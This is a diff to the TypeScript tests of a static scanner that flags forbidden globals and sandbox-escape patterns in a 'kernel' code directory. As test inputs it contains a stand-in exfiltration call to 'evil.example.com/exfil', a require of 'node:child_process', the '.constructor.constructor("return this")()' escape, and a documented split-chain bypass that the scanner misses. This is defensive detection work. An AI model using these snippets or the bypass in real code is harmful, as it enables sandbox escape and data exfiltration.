@@ -177,9 +177,75 @@ test("scanForbiddenGlobalsAst (false-positive guard): ordinary bracket/element a
   assert.deepEqual(found, []);
 });
 
-test("scanForbiddenGlobalsAst (disclosed residual, documented not guessed past): a bare CALL reached directly through a tracked alias, with no further property/element access on the alias itself, is NOT flagged — only a `.foo`/`[\"foo\"]` access on the alias is", () => {
-  const found = scanForbiddenGlobalsAst('const f = fetch;\nf("https://example.com");');
-  assert.deepEqual(found, [], "documents the layer's own disclosed scope boundary, not a defect");
+// --- scanForbiddenGlobalsAst (Issue #211 fix-now): direct call through a bare root or a tracked alias ---
+
+test("scanForbiddenGlobalsAst (Issue #211 fix-now): a direct call through a BARE forbidden root, with no property/element access on the callee, is flagged", () => {
+  const cases: [string, string][] = [
+    ["fetch", 'fetch("https://example.com");'],
+    ["setTimeout", "setTimeout(() => {}, 1000);"],
+    ["setInterval", "setInterval(() => {}, 1000);"],
+    ["require", 'require("node:child_process");'],
+    ["eval", 'eval("1+1");'],
+  ];
+  for (const [name, snippet] of cases) {
+    const found = scanForbiddenGlobalsAst(snippet);
+    assert.ok(
+      found.some((f) => f.name === name && /^direct call through forbidden global/.test(f.detail)),
+      `expected AST layer to flag a direct call to "${name}" in: ${snippet}`,
+    );
+  }
+});
+
+test("scanForbiddenGlobalsAst (Issue #211 fix-now, the exact bug both reviewers demonstrated): a direct call reached through a TRACKED ALIAS, with no property/element access on the alias itself, is now flagged for fetch/setTimeout/setInterval/require — the dominant real invocation shape for these four roots, and exactly the gap that nullified the Q1 ruling's own stated purpose before this fix", () => {
+  const cases: [string, string][] = [
+    ["fetch", 'const f = fetch;\nf("https://evil.example.com/exfil");'],
+    ["setTimeout", "const t = setTimeout;\nt(() => {}, 1000);"],
+    ["setInterval", "const i = setInterval;\ni(() => {}, 1000);"],
+    ["require", 'const r = require;\nr("node:child_process");'],
+  ];
+  for (const [name, snippet] of cases) {
+    const found = scanForbiddenGlobalsAst(snippet);
+    assert.ok(
+      found.some((f) => f.name === name && /^direct call through forbidden global "[^"]+" \(possibly via alias\)/.test(f.detail)),
+      `expected AST layer to flag alias-then-call to "${name}" in: ${snippet}`,
+    );
+  }
+});
+
+test("scanForbiddenGlobalsAst: a call through a PROPERTY ACCESS callee (e.g. `fetch.bind(null)()`) is not double-counted by the new call branch — resolveExpressionRoot only resolves bare identifiers, so the call branch itself contributes nothing extra there; the property-access branch alone still catches it", () => {
+  const found = scanForbiddenGlobalsAst("fetch.bind(null)();");
+  const propertyFindings = found.filter((f) => /property access/.test(f.detail));
+  const callFindings = found.filter((f) => /^direct call/.test(f.detail));
+  assert.ok(propertyFindings.some((f) => f.name === "fetch"), "property access on fetch.bind must still be caught");
+  assert.deepEqual(callFindings, [], "the call branch must not also fire on a non-identifier callee");
+});
+
+// --- scanForbiddenGlobalsAst (Issue #210 fix-now): .constructor.constructor prototype-pivot escape ---
+
+test("scanForbiddenGlobalsAst (Issue #210 fix-now): the classic `.constructor.constructor(...)` prototype-pivot sandbox escape is flagged, even though no tracked root identifier appears anywhere in the source", () => {
+  const cases = [
+    '({}).constructor.constructor("return this")();',
+    'const obj = {};\nobj.constructor.constructor("return this")();',
+  ];
+  for (const source of cases) {
+    const found = scanForbiddenGlobalsAst(source);
+    assert.ok(
+      found.some((f) => f.name === "constructor-pivot" && /\.constructor\.constructor\(\.\.\.\)/.test(f.detail)),
+      `expected the constructor-pivot check to flag: ${source}`,
+    );
+  }
+});
+
+test("scanForbiddenGlobalsAst (Issue #210 fix-now, false-positive guard): a single-level `.constructor` property access or call is NOT flagged — only the double chain immediately called is", () => {
+  assert.deepEqual(scanForbiddenGlobalsAst("x.constructor.name;"), []);
+  assert.deepEqual(scanForbiddenGlobalsAst("x.constructor();"), []);
+});
+
+test("scanForbiddenGlobalsAst (Issue #210, disclosed residual, documented not guessed past): splitting the `.constructor.constructor` chain across two variable declarations bypasses the narrow adjacent-token check — the check is root-independent but not alias-of-`.constructor`-aware", () => {
+  const found = scanForbiddenGlobalsAst(
+    ["const step1 = ({}).constructor;", "const step2 = step1.constructor;", 'step2("return this")();'].join("\n"),
+  );
+  assert.deepEqual(found, [], "documents the check's own disclosed scope boundary, not a defect");
 });
 
 test("scanForbiddenGlobalsAst: pure code with none of the tracked roots produces zero findings", () => {
@@ -312,6 +378,26 @@ test("checkKernelPurity (Issue #63 Q1 Manager ruling, non-vacuous): aliased fetc
   assert.match(details, /aliased-network-timer\.ts.*"setTimeout" found \(AST: property access "\.name"/);
   assert.match(details, /aliased-network-timer\.ts.*"setInterval" found \(AST: property access "\.name"/);
   assert.match(details, /aliased-network-timer\.ts.*"require" found \(AST: property access "\.resolve"/);
+});
+
+test("checkKernelPurity (Issue #211 fix-now, non-vacuous): a direct call through an alias to fetch/setTimeout/setInterval/require, with no property access on the alias, is now caught in the VIOLATING self-test fixture", async () => {
+  const result = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
+  assert.equal(result.ok, false);
+  const details = result.details.join("\n");
+  assert.match(details, /aliased-network-timer\.ts.*"fetch" found \(AST: direct call through forbidden global "fetch"/);
+  assert.match(details, /aliased-network-timer\.ts.*"setTimeout" found \(AST: direct call through forbidden global "setTimeout"/);
+  assert.match(details, /aliased-network-timer\.ts.*"setInterval" found \(AST: direct call through forbidden global "setInterval"/);
+  assert.match(details, /aliased-network-timer\.ts.*"require" found \(AST: direct call through forbidden global "require"/);
+});
+
+test("checkKernelPurity (Issue #210 fix-now, non-vacuous): the .constructor.constructor prototype-pivot escape is caught in the VIOLATING self-test fixture, and the false-positive guard fixture stays clean", async () => {
+  const violating = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/violating");
+  assert.equal(violating.ok, false);
+  const details = violating.details.join("\n");
+  assert.match(details, /constructor-pivot\.ts.*"constructor-pivot" found/);
+
+  const clean = await checkKernelPurity(repoRoot, "src/qa/selftest-fixture/kernel-purity/clean");
+  assert.equal(clean.ok, true, clean.details.join("\n"));
 });
 
 test("checkKernelPurity (Issue #63 AC5 regression): a renamed non-relative import is caught by the existing classifyImport check, independent of the AST forbidden-globals layer", async () => {
